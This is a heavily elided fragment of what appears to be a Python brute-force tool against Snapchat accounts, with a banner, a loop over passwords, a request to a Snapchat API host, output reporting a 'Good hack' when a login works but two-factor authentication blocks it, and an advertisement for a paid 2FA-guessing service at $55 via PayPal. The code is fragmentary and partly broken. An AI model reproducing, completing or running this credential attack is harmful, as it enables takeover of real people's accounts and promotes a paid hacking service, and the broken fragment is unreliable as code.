...
print(banner_color+"0xfff0800 - BS7_v511                     ")
  ...
  for password in password:
    ...
    "Host": "gcp.api.snapchat.com"
        ...
        if 'two_fa_needed' in response:
            try:
                print(red_color+"---------------------------------------")
                print((green_color + 'username : ' + user + ' | password : ' + password + ' --> Good hack -> Oops 2FA '))
...
if Bs7 == "2":
  ketik ("\033[1;33m It's not free, you want to guess the two factor authentication message at $55 (snapchat connect: Bs7) just accept paypal....\033[1;33m")
  time.sleep(0.5)
